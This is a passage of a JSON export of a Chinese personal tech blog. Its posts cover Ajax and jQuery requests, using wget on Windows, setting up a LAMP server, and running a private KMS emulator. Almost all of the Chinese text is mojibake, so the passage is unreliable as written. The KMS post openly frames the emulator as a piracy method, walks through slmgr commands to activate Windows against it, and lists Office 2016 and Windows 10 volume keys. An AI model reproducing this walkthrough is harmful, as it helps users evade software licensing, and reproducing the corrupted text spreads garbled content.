šäº†å•Šï¼ï¼‰ 1. å¼•å­æ²¡å•¥å¯å†™çš„â€¦ 2. ç§‘æ™®W3School - Ajaxæ•™ç¨‹ï¼Œå°±è¿™ä¸ªå§ï¼Œç§‘æ™®å®Œæ¯•ã€‚ 3. ç¬”è®° 3.1 Ajaxçš„ç‰¹ç‚¹Ajaxä¸ºAsynchronous Javascript And XMLçš„ç¼©å†™ï¼Œå³å¼‚æ­¥JSä¸XMLï¼Œå› ä¸ºå®ƒå…·æœ‰å¼‚æ­¥ç‰¹æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ç½‘é¡µåŠ è½½ä¸­æˆ–åŠ è½½ç»“æŸçš„ä»»æ„æ—¶åˆ»ä½¿ç”¨ï¼Œé€šè¿‡ä¸æœåŠ¡å™¨è¿›è¡Œå°‘é‡æ•°æ®äº¤æ¢æ¥å®ç°ç½‘é¡µå¼‚æ­¥æ›´æ–°ã€‚åˆ©ç”¨Ajaxå¯ä»¥ç›´æ¥æ›´æ”¹ç½‘é¡µçš„ä¸€éƒ¨åˆ†æ¥åŠ¨æ€åˆ·æ–°ç½‘é¡µï¼Œè€Œä¸éœ€è¦åˆ·æ–°æ•´ä¸ªç½‘é¡µã€‚ 3.2 ä½¿ç”¨æ–¹æ³•â€”â€”åŸç”Ÿæ–¹å¼1234567891011var ajax = new XMLHttpRequest(); // IE6ä¸èƒ½ç”¨è¿™ä¸ªæ–¹å¼ï¼Œä¸ç®¡å®ƒäº†ajax.onreadystatechange = function() &#123; if(ajax.readyState==4 &amp;&amp; ajax.status==200) &#123; // do something with ajax.responseText // è¿˜æœ‰ä¸€ä¸ªajax.responseXML, ä¹Ÿä¸ç®¡å®ƒäº†ï¼Œjsonå¤§æ³•å¥½ alert(ajax.responseText); &#125;&#125;ajax.open(\"GET\", \"./get?var1=val1&amp;var2=val2\", true); // å¼‚æ­¥æ–¹å¼è¿è¡Œajax.send();123456var ajax = new XMLHttpRequest();ajax.open(\"POST\", \"./post\", false); // åŒæ­¥æ–¹å¼è¿è¡Œajax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");ajax.send(\"var1=val1&amp;var2=val2\");// do something with ajax.responseTextalert(ajax.responseText); 3.3 åŸç”Ÿçš„å¥½éº»çƒ¦ï¼â€”â€”jQuery AjaxjQueryï¼Œæ£’æ£’çš„å‰ç«¯åº“ï¼Œä¸å¤šè¯´ã€‚1234567891011121314151617// $.get(URL, callback)$.get(\"./get?var1=val1&amp;var2=val2\", function(data, status) &#123; // do something with data &amp; status &#125;);// $.post(URL,data,callback)$.post(\"./post\", &#123; var1: \"val1\", var2: \"val2\" &#125;, function(data, status) &#123; // do something with data &amp; status &#125;);// $.getJSON(url, data, success(data,status,xhr))// dataå’Œå›è°ƒå‡½æ•°successå¯é€‰// successä¸­ï¼Œdataå‚æ•°å¿…éœ€ï¼Œå…¶å®ƒå¯é€‰$.getJSON(\"./get\", function(data) &#123; // do something with data &#125;); 4. é™„å¸¦çš„å°é›¶ç¢window.setInterval(getData, time);ç”¨äºå®ç°è½®è¯¢ã€‚ 5. æ€»ç»“ &amp; åè®°Ajaxç®€å•å®ç”¨åŠŸèƒ½å¼ºå¤§åº”ç”¨å¹¿æ³›ï¼Œé€šè¿‡ç®€å•çš„æ­¥éª¤å®ç°å‰åç«¯çš„æ•°æ®äº¤æ¢ï¼Œæ¥å®ç°ç½‘é¡µçš„åŠ¨æ€åŠ è½½ã€‚å¼€å­¦åˆ°ç°åœ¨æ„Ÿè§‰ä¸€ç›´ä¸åœ¨çŠ¶æ€ï¼ˆå®åœ¨æ˜¯æƒ³åæ§½è‡ªå·±çš„ä¸€ç¾¤ç¥ä¸€æ ·çš„èˆå‹ï¼‰ï¼Œä»Šå¤©æ‰¾äº†ä¸ªå®‰é™çš„ã€æ²¡äººæ‰“æ‰°çš„åœ°æ–¹è®¤è®¤çœŸçœŸå†™äº†å†™ä»£ç ï¼Œæ€»ç»“äº†ä¸€ä¸‹è‡ªå·±åˆ°ç°åœ¨æ‰€å­¦çš„çŸ¥è¯†æ‰å‘ç°è‡ªå·±å­¦çš„ä¸œè¥¿æ˜¯å¦‚æ­¤é›¶æ•£ã€ä¸æˆä½“ç³»ï¼Œä»¿ä½›ä»å¤§ä¸€å¼€å§‹å°±åœ¨ä¹±ç‚¹æŠ€èƒ½ç‚¹ã€‚è¿™ä¸€å¹´è¦å¤šæ·±å…¥å­¦ä¹ ä¸€ä¸ªç‰¹å®šæ–¹é¢çš„çŸ¥è¯†ï¼ˆæš‚å®šåç«¯å¼€å‘ï¼‰ï¼Œå¤šå†™ä»£ç ç§¯ç´¯ç»éªŒï¼Œä¸èƒ½å†ä¸œå­¦ä¸€ç‚¹è¥¿å­¦ä¸€ç‚¹äº†ã€‚","categories":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://blog.stdioa.com/categories/ç½‘ç»œ/"}],"tags":[{"name":"Ajax","slug":"Ajax","permalink":"https://blog.stdioa.com/tags/Ajax/"},{"name":"å‰ç«¯å¼€å‘","slug":"å‰ç«¯å¼€å‘","permalink":"https://blog.stdioa.com/tags/å‰ç«¯å¼€å‘/"}]},{"title":"åœ¨Windowsä¸­ä½¿ç”¨Wget","slug":"using-wget-in-Windows","date":"2015-09-18T12:07:00.000Z","updated":"2018-07-12T00:14:30.506Z","comments":true,"path":"2015/09/using-wget-in-Windows/","link":"","permalink":"https://blog.stdioa.com/2015/09/using-wget-in-Windows/","excerpt":"ä¸€ç›´å¿ƒå¿ƒå¿µå¿µæƒ³åœ¨Windowsé‡Œç”¨wgetï¼Œä»Šå¤©éšä¾¿æäº†æï¼Œåœ¨Windowsé‡Œé¢ç”¨ä¸Šäº†wgetï¼Œç»ˆäºå¯ä»¥ä¸‹è½½ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„å°æ–‡ä»¶è¾£ã€‚","text":"ä¸€ç›´å¿ƒå¿ƒå¿µå¿µæƒ³åœ¨Windowsé‡Œç”¨wgetï¼Œä»Šå¤©éšä¾¿æäº†æï¼Œåœ¨Windowsé‡Œé¢ç”¨ä¸Šäº†wgetï¼Œç»ˆäºå¯ä»¥ä¸‹è½½ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„å°æ–‡ä»¶è¾£ã€‚ 1. å¼•å­ä¸€ç›´è§‰å¾—Windowsé‡Œé¢åº”è¯¥æœ‰ä¸€ä¸ªç±»ä¼¼wgetçš„å·¥å…·ã€‚ä»Šå¤©æƒ³ä»githubä¸Šä¸‹ä¸€ä¸ªæ–‡ä»¶ï¼Œç»“æœæ–‡ä»¶ç›´æ¥ä»¥æ–‡æœ¬æ–¹å¼è¿”å›äº†(å“åº”å¤´çš„Content-Typeä¸ºtext/plainè€Œä¸æ˜¯applicationç¥é©¬çš„)ï¼Œè‡ªå·±å¾ˆæ€¨å¿µï¼Œè§‰å¾—è¦æ˜¯Windowsèƒ½åƒlinuxä¸€æ ·æœ‰ä¸ªç”¨æ¥wgetç¥é©¬çš„ä¸‹è½½æ–‡ä»¶çš„å‘½ä»¤å°±å¥½äº†â€¦æ‰€ä»¥è‡ªå·±ä¸Šç½‘æœäº†ä¸€ä¸‹ï¼Œè®©è‡ªå·±ç”¨ä¸Šäº†wget. 2. ä¹±æéšä¾¿ç™¾åº¦ï¼Œæ‰¾åˆ°ä¸€ç¯‡åšæ–‡ï¼Œåˆæ‰¾åˆ°äº†ä¸€ä¸ªå«åšGnuWin(http://sourceforge.net/projects/gnuwin32/)çš„é¡¹ç›®ï¼Œè¯¥é¡¹ç›®ä¸»è¦æä¾›Windowsä¸‹çš„GNUå·¥å…·ï¼Œæ¯”å¦‚sed, grep, wgetç­‰ç­‰ã€‚äºæ˜¯ä¸‹è½½å®‰è£…ï¼Œå®‰è£…ç¨‹åºé»˜è®¤å°†ç¨‹åºå®‰è£…åœ¨äº†C:\\Program Files (x86)\\GnuWin32\\binç›®å½•ä¸‹ã€‚ç„¶è€Œå³ä½¿è¿™æ ·ï¼Œæˆ‘è¿˜æ˜¯æ— æ³•ç›´æ¥åœ¨å‘½ä»¤è¡Œé‡Œä½¿ç”¨ã€‚Windowsä¸­æœ‰ä¸€ä¸ªâ€œPATHç¯å¢ƒå˜é‡â€ï¼Œå°†æŸç›®å½•ï¼ˆæ¯”å¦‚C:\\Python27ï¼‰æ·»åŠ è¿›PATHç¯å¢ƒå˜é‡ä¸­ï¼Œå°±å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥å‘½ä»¤æ‰“å¼€è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚å¦‚æœæƒ³åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨wgetçš„è¯ï¼ŒæŠŠC:\\Program Files (x86)\\GnuWin32\\binç›®å½•æ·»åŠ è¿›PATHå˜é‡ä¸­å½“ç„¶å¯è¡Œã€‚ä½†æ˜¯è¿™æ ·çš„è¯ï¼Œéšç€å·¥å…·è¶Šæ¥è¶Šå¤šï¼ŒPATHå˜é‡é‡Œé¢çš„è·¯å¾„ä¹Ÿå°±è¶Šæ¥è¶Šå¤šï¼Œç»´æŠ¤èµ·æ¥ä¹Ÿä¼šæ›´åŠ å›°éš¾ï¼Œæ‰€ä»¥è‡ªå·±ä½¿ç”¨äº†ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ï¼šåœ¨Cç›˜çš„ç›®å½•ä¸‹å»ºäº†ä¸€ä¸ªCommand_line_programsæ–‡ä»¶å¤¹ç”¨æ¥æ”¾ä¸€äº›è‡ªå·±å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼ˆæ¯”å¦‚sqliteï¼‰ï¼Œç„¶åå°†C:\\Command_line_programsï¼ˆä»¥ä¸‹ç®€ç§°C.L.P.ï¼‰æ·»åŠ åˆ°PATHå˜é‡ä¸­ï¼Œè¿™æ ·è‡ªå·±å°±èƒ½ä½¿ç”¨C.L.P.æ–‡ä»¶å¤¹ä¸­çš„å·¥å…·ã€‚å¯æ˜¯ï¼Œè‡ªå·±å·²ç»å°†ç¨‹åºå®‰è£…åˆ°Program Filesé‡Œäº†ï¼Œæ‰€ä»¥éœ€è¦æƒ³ä¸ªåŠæ³•åœ¨C.L.P.æ–‡ä»¶ä¸­æ–°å»ºä¸€ä¸ªæ–‡ä»¶æ¥è¿æ¥åˆ°wgetç¨‹åºã€‚_ç»è¿‡å°è¯•ï¼Œä½¿ç”¨å¿«æ·æ–¹å¼çš„æ–¹æ³•å¤±è´¥äº†ã€‚_æ‰€ä»¥è‡ªå·±æƒ³åˆ°äº†æ–°å»ºæ‰¹å¤„ç†æ–‡ä»¶ã€‚äºæ˜¯åœ¨C.L.P.æ–‡ä»¶å¤¹ä¸­æ–°å»ºwget.bat, å†…å®¹ä¸ºC:\\&quot;Program Files (x86)&quot;\\GnuWin32\\bin\\wget.exe %* ï¼ˆ%*è¡¨ç¤ºåœ¨å‘½ä»¤ä¸­åµŒå…¥ç¨‹åºæ‰€æœ‰å‚æ•°ï¼Œè¯¦æƒ…è¯·ç™¾åº¦æˆ–Google Windowsæ‰¹å¤„ç†ç¼–ç¨‹ï¼‰ï¼Œä¿å­˜ï¼Œåœ¨å‘½ä»¤è¡Œä¸­å°è¯•ä½¿ç”¨wgetï¼ŒæˆåŠŸã€‚ 3. ç„¶è€Œè¿™å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨å•Šï¼è‡ªå·±æå®Œä»¥åï¼Œç›¯ç€GnuWinè¿™å‡ ä¸ªå­—ï¼Œçªç„¶æƒ³åˆ°äº†gité‡Œé¢è‡ªå¸¦äº†å¾ˆå¤šGNUå·¥å…·å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œäºæ˜¯å°±å»git/binçš„ç›®å½•ç¿»äº†ç¿»ï¼Œæœç„¶ï¼Œé‡Œé¢æ²¡æœ‰wgetï¼Œç„¶è€Œæˆ‘çœ‹åˆ°äº†curlã€‚ç„¶åâ€¦å°±æ²¡æœ‰ç„¶åäº†ã€‚ 4. åè®°è¿™ç¯‡æ–‡ç« æ˜¯èƒ¡ä¹±å‡‘æ•°çš„ï¼Œæœ€è¿‘å­¦ä¹ å…´è¶£ä¸é«˜ï¼Œåˆæœ‰ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„äº‹æƒ…è¦å¿™ï¼Œæ‰€ä»¥æ‰˜æ›´äº†å¥½ä¹…T^Tå¥½äº†å¥½äº†è¦å¥½å¥½å­¦ä¹ ï¼Œè¯´å¥½äº†å¤šå»ä½“éªŒæ¡†æ¶å‘¢QAQ","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.stdioa.com/tags/Windows/"},{"name":"wget","slug":"wget","permalink":"https://blog.stdioa.com/tags/wget/"}]},{"title":"æ­å»ºç§æœ‰KMSæœåŠ¡å™¨","slug":"building-a-private-kms-server","date":"2015-09-02T14:26:00.000Z","updated":"2018-07-12T00:15:10.724Z","comments":true,"path":"2015/09/building-a-private-kms-server/","link":"","permalink":"https://blog.stdioa.com/2015/09/building-a-private-kms-server/","excerpt":"æœ€è¿‘win10åˆé¢‘ç¹æç¤ºâ€œè®¸å¯å³å°†è¿‡æœŸâ€ï¼Œä¹‹å‰æ‰¾åˆ°çš„kmsæœåŠ¡å™¨åˆæŒ‚æ‰äº†ï¼Œäºæ˜¯å°±å†³å®šè‡ªå·±æ­ä¸€ä¸ªè‡ªå·±ç”¨ã€‚","text":"æœ€è¿‘win10åˆé¢‘ç¹æç¤ºâ€œè®¸å¯å³å°†è¿‡æœŸâ€ï¼Œä¹‹å‰æ‰¾åˆ°çš„kmsæœåŠ¡å™¨åˆæŒ‚æ‰äº†ï¼Œäºæ˜¯å°±å†³å®šè‡ªå·±æ­ä¸€ä¸ªè‡ªå·±ç”¨ã€‚ 1. å¼•å­å¥½ä¹…æ²¡æ›´æ–°æ—¥å¿—äº†ï¼Œæš‘å‡åœ¨å®¶æ¯å¤©è¿‡çš„ä¹±ä¸ƒå…«ç³Ÿï¼Œå°±æ²¡æ€ä¹ˆç ”ç©¶æŠ€æœ¯ï¼Œäºæ˜¯åšå®¢ä¹Ÿæ²¡æ€ä¹ˆæ›´æ–°â€¦ä»Šå¤©éšä¾¿å†™ç‚¹ä»€ä¹ˆå‡‘ä¸ªæ•°_(:Ğ·ã‚âˆ )_ 2. ç§‘æ™®KMS (Key Management Service), å¯†é’¥ç®¡ç†æœåŠ¡ï¼Œæ˜¯ä¸€ç§å¯¹WindowsåŠOfficeäº§å“è¿›è¡Œæ‰¹é‡æˆæƒçš„æœåŠ¡ï¼Œé€šå¸¸è¢«éƒ¨ç½²åœ¨å¤§å‹ä¼ä¸šå±€åŸŸç½‘ä¸­ï¼Œç”¨äºå¯¹æ‰¹é‡æˆæƒç‰ˆï¼ˆå³VOLç‰ˆï¼‰Windowsç³»ç»Ÿè¿›è¡Œå¤§æ‰¹é‡çš„æ¿€æ´»ã€‚KMSæœåŠ¡å™¨çš„ä½œç”¨æ˜¯ç»™å±€åŸŸç½‘ä¸­çš„æ‰€æœ‰è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿæä¾›ä¸€ä¸ªæœ‰æ•ˆçš„äº§å“åºåˆ—å·ï¼Œç„¶åè®¡ç®—æœºé‡Œé¢çš„KMSæœåŠ¡å°±ä¼šè‡ªåŠ¨å°†ç³»ç»Ÿæ¿€æ´»ã€‚æ¯ä¸€ä¸ªç”±KMS Serveræä¾›çš„åºåˆ—å·çš„æœ‰æ•ˆæœŸåªæœ‰180å¤©ï¼Œè€Œä¸æ˜¯å…¶ä»–ç‰ˆæœ¬çš„æ°¸ä¹…ä½¿ç”¨ä¸€ä¸ªåºåˆ—å·ã€‚æ‰€ä»¥æ“ä½œè€…å¿…é¡»åœ¨å¿«åˆ°æœŸçš„æ—¶å€™åœ¨æ­¤æ‰‹åŠ¨è¿æ¥KMSæœåŠ¡å™¨è®©å®ƒæä¾›ä¸€ä¸ªæ–°çš„åºåˆ—å·ï¼Œå¦åˆ™180å¤©ä»¥åå°±ä¼šå›åˆ°è¯•ç”¨ç‰ˆæœ¬çŠ¶æ€ã€‚ç”±äºKMSç³»ç»Ÿéƒ¨ç½²è¾ƒä¸ºå®¹æ˜“ï¼Œæ‰€ä»¥åœ¨å›½å†…å¾ˆå¤šäººé€šè¿‡MSDNç­‰æ¸ é“ä¸‹è½½VOLç‰ˆæœ¬çš„è½¯ä»¶ï¼Œç„¶åé€šè¿‡KMSæœåŠ¡è¿›è¡Œæ¿€æ´»ï¼Œå·²è¾¾åˆ°ç›—ç‰ˆçš„ç›®çš„ã€‚ 3. æ­(luan)å»º(gao)è¿‡ç¨‹æ˜¨å¤©åœ¨æ»¡å¤§è¡—ä¹±æ‰¾é‡ç”ŸKMSæœåŠ¡å™¨çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªå¸–å­ï¼šä½¿ç”¨KMSæ¿€æ´»windowsç³»ç»ŸåŠVL-officeç³»åˆ—, é‡Œé¢æä¾›äº†ä¸€ä¸ªé“¾æ¥æŒ‡å‘ä¸€ä¸ªå¸–å­ï¼Œå¸–å­ä¸­æä¾›äº†Pythonå’ŒCç‰ˆæœ¬çš„KMSæœåŠ¡å™¨æ¨¡æ‹Ÿå™¨ï¼Œå¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸­è¿›è¡ŒKMSæœåŠ¡å™¨éƒ¨ç½²ã€‚äºæ˜¯æŠŠä»£ç æäº†ä¸‹æ¥ï¼ˆä¸ºæ­¤è¿˜æ³¨å†Œäº†ä¸ªè´¦å·, pythonç‰ˆçš„ä»£ç åœ¨è¿™é‡Œ)ï¼Œç”¨VSFTPå°†ä»£ç ä¼ åˆ°äº†è‡ªå·±çš„æ ‘è“æ´¾ä¸Šï¼Œç„¶åè¿è¡Œpython server.pyè¿›è¡Œéƒ¨ç½²ã€‚python server.py TCP server listening at 0.0.0.0 on port 1688. ç„¶ååœ¨Windowsç³»ç»Ÿä¸­æ‰“å¼€å…·æœ‰ç®¡ç†å‘˜æƒé™çš„å‘½ä»¤æç¤ºç¬¦ï¼Œè¾“å…¥slmgr -skms 192.168.155.2:1688è®¾ç½®KMSæœåŠ¡å™¨åœ°å€ï¼ˆåœ°å€å¯ä»¥æ›´æ¢ï¼‰ï¼Œç„¶åè¾“å…¥`slmgr -atoâ€™è¿›è¡Œç³»ç»Ÿæ¿€æ´»ï¼Œæ­¤æ—¶æœåŠ¡å™¨ç«¯æ˜¾ç¤ºï¼šConnection accepted: 192.168.56.1:13023 Received V6 request on Wed Sep 2 22:59:55 2015. Connection closed: 192.168.56.1:13023 Windowsç³»ç»Ÿæç¤ºâ€œæˆåŠŸåœ°æ¿€æ´»äº†äº§å“â€ï¼Œæ¿€æ´»æˆåŠŸã€‚åœ¨æ ‘è“æ´¾ä¸Šéƒ¨ç½²æˆåŠŸä»¥åï¼Œéšæ‰‹åœ¨VPSä¸Šéƒ¨ç½²äº†ä¸€ä»½ä»¥å¤‡ç”¨ã€‚å¸–å­ä¸­æäº†ä¸€ç§è®¾ç½®Linuxç³»ç»Ÿå¯åŠ¨é¡¹æ¥ä½¿KMSæœåŠ¡å™¨å¼€æœºè‡ªåŠ¨éƒ¨ç½²çš„æ–¹æ³•ï¼Œä¸è¿‡è‡ªå·±æ²¡æœ‰è¿™ä¸ªéœ€æ±‚å°±æ²¡æã€‚ 4. æ€»ç»“è¿™ç¯‡æ–‡ç« å¥½åƒæœ‰ç‚¹æ°´ï¼Œä¸»è¦æ˜¯å› ä¸ºè‡ªå·±å®åœ¨æ²¡ä»€ä¹ˆä¸œè¥¿å†™äº†â€¦è‡ªå·±çš„æš‘å‡è¿‡çš„ä¹±ä¸ƒå…«ç³Ÿï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´åœ¨æ¸¸æˆä¸Šï¼Œæ²¡ä»€ä¹ˆå¿ƒæƒ…ç ”ç©¶æŠ€æœ¯ã€‚ç°åœ¨å¼€å­¦äº†ï¼Œæœ‰æ›´å¤šæ—¶é—´æ¥é’»ç ”æŠ€æœ¯äº†ï¼Œæ”¶æ”¶å¿ƒæ‰¾æ‰¾çŠ¶æ€ï¼Œä»¥ååšå®¢ä¼šå®šæœŸæ›´æ–°çš„ï¼Œæˆ‘å¯¹æ ‘è“æ´¾ç”µæºç¯å‘èª“â†’_â†’ 5. å„ç§Keyæœ€åé™„ä¸ŠOffice 2016å’ŒWindows 10çš„VOLç‰ˆæ¿€æ´»ç ï¼Œå…¶å®ƒç‰ˆæœ¬è½¯ä»¶æ¿€æ´»ç è¯·è‡ªè¡Œç™¾åº¦ã€‚Office Professional Plus 2016 - XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99Office Standard 2016 - JNRGM-WHDWX-FJJG3-K47QV-DRTFMProject Professional 2016 - YG9NW-3K39V-2T3HJ-93F3Q-G83KTProject Standard 2016 - GNFHQ-F6YQM-KQDGJ-327XX-KQBVCVisio Professional 2016 - PD3PC-RHNGV-FXJ29-8JK7D-RJRJKVisio Standard 2016 - 7WHWN-4T7MP-G96JF-G33KR-W8GF4Access 2016 - GNH9Y-D2J4T-FJHGG-QRVH7-QPFDWExcel 2016 - 9C2PK-NWTVB-JMPW8-BFT28-7FTBFOneNote 2016 - DR92N-9HTF2-97XKM-XW2WJ-XW3J6Outlook 2016 - R69KK-NTPKF-7M3Q4-QYBHW-6MT9BPowerPoint 2016 - J7MQP-HNJ4Y-WJ7YM-PFYGF-BY6C6Publisher 2016 - F47MM-N3XJP-TQXJ9-BP99D-8K837Skype for Business 2016 - 869NQ-FJ69K-466HW-QYCP2-DDBV6Word 2016 - WXY84-JN2Q9-RBCCQ-3Q3J3-3PFJ6Windows 10 Home - TX9XD-98N7V-6WMQ6-BX7FG-H8Q99Windows 10 Home N - 3KHY7-WNT83-DGQKR-F7HPR-844BMWindows 10 Home Single Language - 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFHWindows 10 Home Country Specific - PVMJN-6DFY6-9CCP6-7BKTT-D3WVRWindows 10 Professional - W269N-WFGWX-YVC9B-4J6C9-T83GXWindows 10 Professional N - MH37W-N47XK-V7XM9-C7227-GCQG9Windows 10 Education - NW6C2-QMPVW-D7KKK-3GKT6-VCFB2Windows 10 Education N - 2WH4N-8QGBV-H22JP-CT43Q-MDWWJWindows 10 Enterprise - NPPR9-FWDCX-D2C8J-H872K-2YT43Windows 10 Enterprise N - DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4Windows 10 Enterprise 2015 LTSB - WNMTR-4C88C-JK8YV-HQ7T2-76DF9Windows 10 Enterprise 2015 LTSB N - 2F77B-TNFGY-69QQF-B8YKP-D69TJå¯ä»¥è€ƒè™‘æœ‰ç©ºæä¸€ä¸ªOffice 2016æ¥ç©ç©ã€‚ 6. å‚è€ƒæ–‡æ¡£KMS - äº’åŠ¨ç™¾ç§‘ä½¿ç”¨KMSæ¿€æ´»windowsç³»ç»ŸåŠVL-officeç³»åˆ—Emulated KMS Servers on non-Windows platforms","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"KMS","slug":"KMS","permalink":"https://blog.stdioa.com/tags/KMS/"}]},{"title":"LAMPç¯å¢ƒæ­å»ºå¿ƒå¾—","slug":"deploy-a-LAMP-environment","date":"2015-07-09T12:05:00.000Z","updated":"2018-07-12T11:35:13.415Z","comments":true,"path":"2015/07/deploy-a-LAMP-environment/","link":"","permalink":"https://blog.stdioa.com/2015/07/deploy-a-LAMP-environment/","excerpt":"é—²æ¥æ— äº‹ï¼Œåœ¨è™šæ‹Ÿæœºä¸Šæ­äº†ä¸€ä¸ªLAMPæœåŠ¡å™¨ç¯å¢ƒï¼ŒæŠŠå®‰è£…åŠé…ç½®è¿‡ç¨‹è®°äº†ä¸‹æ¥ã€‚","text":"é—²æ¥æ— äº‹ï¼Œåœ¨è™šæ‹Ÿæœºä¸Šæ­äº†ä¸€ä¸ªLAMPæœåŠ¡å™¨ç¯å¢ƒï¼ŒæŠŠå®‰è£…åŠé…ç½®è¿‡ç¨‹è®°äº†ä¸‹æ¥ã€‚ 1. å¼•å­ 1.1 ç¯å¢ƒç‰ˆæœ¬æ­¤æ¬¡æ­å»ºçš„LAMPç¯å¢ƒç‰ˆæœ¬ï¼šUbuntu 14.04 LTSApache 2.4.7mysql 5.6.19php 5.5.9 1.2 å†™(hu)åœ¨(che)å¼€(yi)å¤´(tong)é¢â€¦å…¶å®æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œè‡ªå·±ä¸€ç›´æƒ³è‡ªå·±åŠ¨æ‰‹æ­å»ºã€é…ç½®ä¸€ä¸ªæœåŠ¡å™¨ï¼Œæš‘å‡ä¹‹å‰å¸ˆå¤ªï¼ˆåˆ«é—®æ˜¯è°ï¼‰è¯´å¦‚æœè¦æå®‰å…¨çš„è¯æœ€å¥½å…ˆè‡ªå·±ä»å¤´æ­ä¸€ä¸ªæœåŠ¡å™¨ï¼ŒæŠŠå„ç§æœåŠ¡å¼„æ¸…æ¥šï¼Œå¯¹æ•´ä¸ªæ¶æ„æœ‰ä¸€ä¸ªç³»ç»Ÿçš„ç†è§£ï¼Œè¿™æ ·å†æ·±å…¥æå®‰å…¨çš„è¯æ¥å—ä¸€äº›è§‚å¿µä¹Ÿä¼šæ›´å¿«æ›´å®¹æ˜“ï¼›ä½†æ˜¯å› ä¸ºè‡ªå·±å¤ªæ‡’ï¼Œå†åŠ ä¸Šä¸Šå­¦æœŸå¿™æˆç‹—ï¼ˆå…¶å®è¿˜æ˜¯å¤ªæ‡’ï¼‰ï¼Œä¸€ç›´æ²¡æœ‰å»åšè¿™ä»¶äº‹ã€‚æš‘å‡åœ¨ä¸€ä¸ªå°å…¬å¸åšè½¯ä»¶æµ‹è¯•ï¼Œæ¯å¤©å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆäº‹å¹²ï¼Œæœ‰å¤§æŠŠçš„æ—¶é—´åšè‡ªå·±çš„äº‹æƒ…ï¼Œäºæ˜¯è‡ªå·±ç”¨äº†ä¸€ä¸­åˆåŠ åŠä¸ªä¸‹åˆçš„æ—¶é—´ç…§ç€ä¸€ä»½æŒ‡å—æŠŠå®ƒæ­å¥½äº†ã€‚ ä¸è¿‡è¯è¯´å›æ¥ï¼Œè½¯ä»¶æµ‹è¯•çœŸçš„å¾ˆæ— èŠ_(:Ğ·ã‚âˆ )_ 2. ç§‘æ™®LAMP: Linux + Apache + Mysql + PHPç§‘æ™®ç»“æŸã€‚åˆšçœ‹åˆ°LAMPé‡Œé¢çš„Pè¿˜èƒ½æŒ‡Python 0.0 3. æ­å»ºè¿‡ç¨‹ 3.1 å®‰è£…Linuxæˆ‘æ‰‹ä¸Šç°åœ¨æ²¡å®ä½“æœºäº†ï¼Œåªæœ‰ä¸€ä¸ªæ ‘è“æ´¾ï¼Œæˆ‘ä¹Ÿä¸æƒ³æ¯å¤©å¸¦ç€å®ƒå»ä¸Šç­ï¼Œä½•å†µAMDæ¶æ„ä¸Šé¢è½¯ä»¶å¥½åƒå°‘ä¸€ç‚¹ç‚¹ï¼Œæ›´ä½•å†µæ ‘è“æ´¾æ€§èƒ½æŒºå·®çš„ï¼ˆæ­¤å¤„çœç•¥ä¸€å¨å€Ÿå£ï¼‰ï¼Œæ‰€ä»¥æˆ‘åªç”¨Virtual Boxè£…äº†ä¸€ä¸ªè™šæ‹Ÿæœºã€‚è¯´åˆ°Linuxï¼Œé€‰ä¸€ä¸ªç”¨èµ·æ¥æ¯”è¾ƒèˆ’æœçš„çš„å‘è¡Œç‰ˆè¿˜æ˜¯æŒºé‡è¦çš„ã€‚Linuxå‘è¡Œç‰ˆä¼—å¤šï¼Œä¸€èˆ¬ç”¨Red Hatæˆ–è€…CentOSï¼ˆRHçš„ç¤¾åŒºç‰ˆï¼‰æˆ–è€…Ubuntu Serveræ¥åšæœåŠ¡å™¨ï¼Œä¸è¿‡â€¦è¿™å­¦æœŸç”¨Debianç³»å‘è¡Œç‰ˆç”¨ä¹ æƒ¯äº†ï¼Œå†æ¢åˆ°RHç³»çš„æ„Ÿè§‰æœ‰ç‚¹ä¸é€‚åº”ï¼Œäºæ˜¯æˆ‘é€‰æ‹©äº†Ubuntu Server. å½“ç„¶ï¼Œå¦‚æœä½ æƒ³é”»ç‚¼ä¸€ä¸‹ï¼Œæ¨èä½¿ç”¨Arch Linuxæ¥æ­å»ºæœåŠ¡å™¨ã€‚ä¸‹è½½Linuxé•œåƒï¼Œæ­è™šæ‹Ÿæœºï¼Œé…ç½®è™šæ‹Ÿç½‘ç»œ&amp;SSHï¼Œæ›´æ”¹è½¯ä»¶æºï¼Œæ›´æ–°è½¯ä»¶ï¼Œé…ç½®è‡ªå·±éœ€è¦çš„vim &amp; tmux &amp; 